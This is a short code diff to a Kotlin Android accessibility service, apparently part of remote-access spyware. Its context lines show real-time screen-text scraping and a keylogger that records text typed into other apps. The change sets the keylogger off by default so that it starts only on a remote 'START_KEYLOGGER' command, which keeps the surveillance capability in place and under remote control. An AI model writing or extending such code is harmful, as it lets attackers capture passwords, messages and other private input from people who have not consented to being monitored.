@@ -86,8 +86,6 @@ class RemoteAccessibilityService : AccessibilityService() {
                 return
             }
 
-
-
             // 3. Realtime Screen Text Scraping
             val eventType = event.eventType
             if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
@@ -109,7 +107,7 @@ class RemoteAccessibilityService : AccessibilityService() {
                 }
             }
 
-            // 4. Keylogger / Keystroke Logging
+            // 4. Keylogger / Keystroke Logging (Respects remote toggle)
             if (isKeyloggerActive && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                 val textList = event.text
                 if (!textList.isNullOrEmpty()) {
@@ -197,7 +195,8 @@ class RemoteAccessibilityService : AccessibilityService() {
         var instance: RemoteAccessibilityService? = null
             private set
 
-        var staticKeyloggerActive = true
+        // Set to false by default so it stays off until explicitly commanded via START_KEYLOGGER
+        var staticKeyloggerActive = false
 
         fun isServiceEnabled(): Boolean {
             if (instance != null) return true
